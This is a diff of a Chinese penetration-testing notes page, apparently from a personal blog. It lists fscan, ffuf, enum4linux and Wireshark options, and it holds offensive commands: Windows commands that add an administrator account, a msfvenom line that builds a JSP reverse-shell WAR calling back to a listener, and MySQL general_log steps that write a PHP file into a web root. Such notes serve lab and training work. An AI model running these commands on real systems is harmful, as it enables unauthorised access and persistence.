-</blockquote>
-<p><img src="/images/earth/image-20230607170243870.png"></p>
-<p>要创建三个文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /dev/shm/kHgTFI5G</span><br><span class="line">touch /dev/shm/Zw7bV9U5</span><br><span class="line">touch /tmp/kcM0Wewe</span><br></pre></td></tr></table></figure>
+<h2 id="windows用户操作"><a href="#windows用户操作" class="headerlink" title="windows用户操作"></a>windows用户操作</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看用户：net user</span><br><span class="line">添加用户：net user name password /add，例如：net user monkey111 123456 /add</span><br><span class="line">将此用户提升为管理员：net localgroup administrators monkey111 /add</span><br><span class="line">查看所有管理员：net user administrators</span><br><span class="line">删除账号：net user monkey111 /delete</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/earth/image-20230607170408204.png"></p>
-<p>重置密码为<code>Earth</code>，使用<code>su root</code>进行登录</p>
-<p><img src="/images/earth/image-20230607170458205.png"></p>
+<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>常用命令参数如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">-c string</span><br><span class="line">      ssh命令执行</span><br><span class="line">-cookie string</span><br><span class="line">      设置cookie</span><br><span class="line">-debug int</span><br><span class="line">      多久没响应,就打印当前进度(default 60)</span><br><span class="line">-domain string</span><br><span class="line">      smb爆破模块时,设置域名</span><br><span class="line">-h string</span><br><span class="line">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class="line">-hf string</span><br><span class="line">      读取文件中的目标</span><br><span class="line">-hn string</span><br><span class="line">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class="line">-m string</span><br><span class="line">      设置扫描模式: -m ssh (default &quot;all&quot;)</span><br><span class="line">-no</span><br><span class="line">      扫描结果不保存到文件中</span><br><span class="line">-nobr</span><br><span class="line">      跳过sql、ftp、ssh等的密码爆破</span><br><span class="line">-nopoc</span><br><span class="line">      跳过web poc扫描</span><br><span class="line">-np</span><br><span class="line">      跳过存活探测</span><br><span class="line">-num int</span><br><span class="line">      web poc 发包速率  (default 20)</span><br><span class="line">-o string</span><br><span class="line">      扫描结果保存到哪 (default &quot;result.txt&quot;)</span><br><span class="line">-p string</span><br><span class="line">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)</span><br><span class="line">-pa string</span><br><span class="line">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class="line">-path string</span><br><span class="line">      fcgi、smb romote file path</span><br><span class="line">-ping</span><br><span class="line">      使用ping代替icmp进行存活探测</span><br><span class="line">-pn string</span><br><span class="line">      扫描时要跳过的端口,as: -pn 445</span><br><span class="line">-pocname string</span><br><span class="line">      指定web poc的模糊名字, -pocname weblogic</span><br><span class="line">-proxy string</span><br><span class="line">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class="line">-user string</span><br><span class="line">      指定爆破时的用户名</span><br><span class="line">-userf string</span><br><span class="line">      指定爆破时的用户名文件</span><br><span class="line">-pwd string</span><br><span class="line">      指定爆破时的密码</span><br><span class="line">-pwdf string</span><br><span class="line">      指定爆破时的密码文件</span><br><span class="line">-rf string</span><br><span class="line">      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)</span><br><span class="line">-rs string</span><br><span class="line">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class="line">-silent</span><br><span class="line">      静默扫描,适合cs扫描时不回显</span><br><span class="line">-sshkey string</span><br><span class="line">      ssh连接时,指定ssh私钥</span><br><span class="line">-t int</span><br><span class="line">      扫描线程 (default 600)</span><br><span class="line">-time int</span><br><span class="line">      端口扫描超时时间 (default 3)</span><br><span class="line">-u string</span><br><span class="line">      指定Url扫描</span><br><span class="line">-uf string</span><br><span class="line">      指定Url文件扫描</span><br><span class="line">-wt int</span><br><span class="line">      web访问超时时间 (default 5)</span><br><span class="line">-pocpath string</span><br><span class="line">      指定poc路径</span><br><span class="line">-usera string</span><br><span class="line">      在原有用户字典基础上,新增新用户</span><br><span class="line">-pwda string</span><br><span class="line">      在原有密码字典基础上,增加新密码</span><br><span class="line">-socks5</span><br><span class="line">      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)</span><br><span class="line">-sc </span><br><span class="line">      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)</span><br></pre></td></tr></table></figure>
+
+<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h3><ul>
+<li>过滤所有的http请求包：<code>http.request</code></li>
+<li>过滤所有的http响应包：<code>http.response</code></li>
+<li>获取主机信息：<code>nbns</code></li>
+</ul>
+<h3 id="常见配置"><a href="#常见配置" class="headerlink" title="常见配置"></a>常见配置</h3><h4 id="配置显示域名对应的IP地址"><a href="#配置显示域名对应的IP地址" class="headerlink" title="配置显示域名对应的IP地址"></a>配置显示域名对应的IP地址</h4><p><code>编辑</code>-&gt;<code>首选项</code>-&gt;<code>Name Resolution</code>-&gt;勾选图中箭头所指处</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611121714908.png" alt="image-20230611121714908"></p>
+<h4 id="快速获取列"><a href="#快速获取列" class="headerlink" title="快速获取列"></a>快速获取列</h4><p>右键要选择的列，添加到列</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611122946330.png" alt="image-20230611122946330"></p>
+<p>然后可以修改名字，右键列顶栏，然后部署列</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611123030886.png" alt="image-20230611123030886"></p>
+<p>可以进行修改</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611123043959.png" alt="image-20230611123043959"></p>
+<h2 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><h3 id="常见命令参数"><a href="#常见命令参数" class="headerlink" title="常见命令参数"></a>常见命令参数</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-D	与 -e 标志一起使用。用 -e 提供的每个扩展替换单词列表条目中的 %EXT%</span><br><span class="line">-H 	&quot;名称:值&quot;</span><br><span class="line">		标头“名称：值”，以冒号分隔。接受多个 -H 标志</span><br><span class="line">-V 	显示版本信息</span><br><span class="line">-X string</span><br><span class="line">		使用的HTTP方法(默认为“GET”)</span><br><span class="line">-ac	自动校准过滤选项</span><br><span class="line">-c	着色输出</span><br><span class="line">-d 	string</span><br><span class="line">		POST数据</span><br><span class="line">-e 	string</span><br><span class="line">		以逗号分隔的要应用的扩展名列表。提供的每个扩展都会扩展一次单词列表条目</span><br><span class="line">-fc string</span><br><span class="line">		从响应中过滤 HTTP 状态代码</span><br><span class="line">-fr string</span><br><span class="line">		过滤 HTTP 响应大小</span><br><span class="line">-fw string</span><br><span class="line">		按响应中的字数过滤</span><br><span class="line">-k 	TLS 身份验证</span><br><span class="line">-mc string</span><br><span class="line">		匹配来自respose的HTTP状态码，使用“all”来匹配每一个响应码。 （默认“200,204,301,302,307,401,403”）</span><br><span class="line">-mr string</span><br><span class="line">		匹配正则表达式</span><br><span class="line">-ms string</span><br><span class="line">		匹配 HTTP 响应大小</span><br><span class="line">-mw string</span><br><span class="line">		匹配响应中的字数</span><br><span class="line">-o 	string</span><br><span class="line">		将输出写入文件</span><br><span class="line">-of	string</span><br><span class="line">		输出文件格式。可用格式：json、csv、ecsv（默认“json”）</span><br><span class="line">-p 	delay</span><br><span class="line">		请求之间的延迟秒数，或一系列随机延迟。例如“0.1”或“0.1-2.0”</span><br><span class="line">-r	跟随重定向</span><br><span class="line">-s	不打印附加信息（静默模式）</span><br><span class="line">-sa	停止所有错误情况。暗示 -sf 和 -se</span><br><span class="line">-se	停止虚假错误</span><br><span class="line">-sf	当 &gt; 95% 的响应返回 403 Forbidden 时停止</span><br><span class="line">-t int</span><br><span class="line">		并发线程数(默认40)</span><br><span class="line">-timeout int</span><br><span class="line">		HTTP 请求超时秒数。 （默认 10）</span><br><span class="line">-u string</span><br><span class="line">		目标网址</span><br><span class="line">-w string</span><br><span class="line">		字典路径</span><br><span class="line">-x string</span><br><span class="line">		HTTP 代理网址</span><br><span class="line">-ic	忽略wordlist注释(默认值:false)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux其他常见知识点"><a href="#Linux其他常见知识点" class="headerlink" title="Linux其他常见知识点"></a>Linux其他常见知识点</h2><ul>
+<li>后台运行程序：<ul>
+<li><code>command &gt; out.file 2&gt;&amp;1 &amp;</code></li>
+<li><code>nohup command &gt; myout.file 2&gt;&amp;1 &amp;</code></li>
+<li><code>nohup command &amp;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h2><ul>
+<li>该工具的主要作用：用于枚举Windows和Samba主机中的数据</li>
+</ul>
+<h3 id="常见配置参数"><a href="#常见配置参数" class="headerlink" title="常见配置参数"></a>常见配置参数</h3><p>参考文章链接：<a target="_blank" rel="noopener" href="https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/">https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/</a></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">用法: enum4linux [选项] ip地址</span><br><span class="line"></span><br><span class="line">枚举选项：</span><br><span class="line">     -U        获取用户列表</span><br><span class="line">     -M        获取机器列表*</span><br><span class="line">     -S        获取共享列表</span><br><span class="line">     -P        获取密码策略信息</span><br><span class="line">     -G        获取组和成员列表</span><br><span class="line">     -d        详述适用于-U和-S</span><br><span class="line">     -u user   用户指定要使用的用户名（默认&quot;&quot;）</span><br><span class="line">     -p pass   指定要使用的密码（默认为&quot;&quot;）</span><br><span class="line">     </span><br><span class="line">其他选项:</span><br><span class="line">    -a        做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项</span><br><span class="line">    -h        显示此帮助消息并退出</span><br><span class="line">    -r        通过RID循环枚举用户</span><br><span class="line">    -R range  RID范围要枚举（默认值：500-550,1000-1050，隐含-r）</span><br><span class="line">    -K n      继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用</span><br><span class="line">    -l        通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）</span><br><span class="line">    -s        文件暴力猜测共享名称</span><br><span class="line">    -k user   远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）</span><br><span class="line">              用于获取sid与“lookupsid known_username”</span><br><span class="line">              使用逗号尝试几个用户：“-k admin，user1，user2”</span><br><span class="line">    -o        获取操作系统信息</span><br><span class="line">    -i        获取打印机信息</span><br><span class="line">    -w wrkg   手动指定工作组（通常自动找到）</span><br><span class="line">    -n        做一个nmblookup（类似于nbtstat）</span><br><span class="line">    -v        详细输出，显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><ul>
+<li>生成war格式木马：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f war -o revshell.war</code></li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="MySQL日志shell"><a href="#MySQL日志shell" class="headerlink" title="MySQL日志shell"></a>MySQL日志shell</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看日志是否开启：show variables like &quot;%general%&quot;</span><br><span class="line">打开日志读写功能：set global general_log=&#x27;on&#x27;</span><br><span class="line">设置日志存储文件：set global general_log_file=&quot;C:/phpStudy/WWW/monkey111.php&quot;</span><br><span class="line">进行查询写shell：select &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL写shell"><a href="#MySQL写shell" class="headerlink" title="MySQL写shell"></a>MySQL写shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看系统变量：SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">	如果为null的话，就是没有设置允许操作的目录，所以没法导出到文件</span><br><span class="line">	如果为具体的目录，则可以考虑导出到指定目录，或者从指定目录导出</span><br><span class="line">	如果变量值为空，则可以使用任意目录</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -375,7 +605,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/18/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/18/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -399,7 +629,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
